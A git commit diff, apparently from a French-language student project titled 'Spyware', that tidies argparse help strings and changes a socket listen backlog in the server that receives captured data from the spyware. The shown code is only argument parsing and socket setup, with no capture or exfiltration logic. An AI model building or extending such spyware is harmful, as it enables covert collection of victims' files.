6a2ec9f71a9da6d82bf06dc43824c78b7c12e860
M. MILLER Lucas <lucas.lm.miller@gmail.com>
2023-11-12 12:12:40 +0100

    ADD fix

--- srv/main-srv.py
+++ srv/main-srv.py
@@ -11,14 +11,9 @@ TXT_GLOB = ""
 
 def argument():
     p = argparse.ArgumentParser(description='Projet Python - Spyware')
-    p.add_argument('-l', '--listen', type=int, action='store_true', help="se met en écoute sur le port TCP saisi par "
-                                                                         "l'utilisateur et attend les données du "
-                                                                         "spyware UP")
-    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le "
-                                                             "programme")
-    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur "
-                                                                 "du spyware. Le contenu doit être parfaitement "
-                                                                 "lisible")
+    p.add_argument('-l', '--listen', action='store_true', help="se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware UP")
+    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le programme")
+    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur du spyware. Le contenu doit être parfaitement lisible")
     p.add_argument('-k', '--kill', action='store_true',
                    help="arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de "
                         "supprimer la capture.")
@@ -30,7 +25,7 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 server_socket.bind(("0.0.0.0", PORT))
 
-server_socket.listen(5)
+server_socket.listen(1)
 
 
 def kill_all():
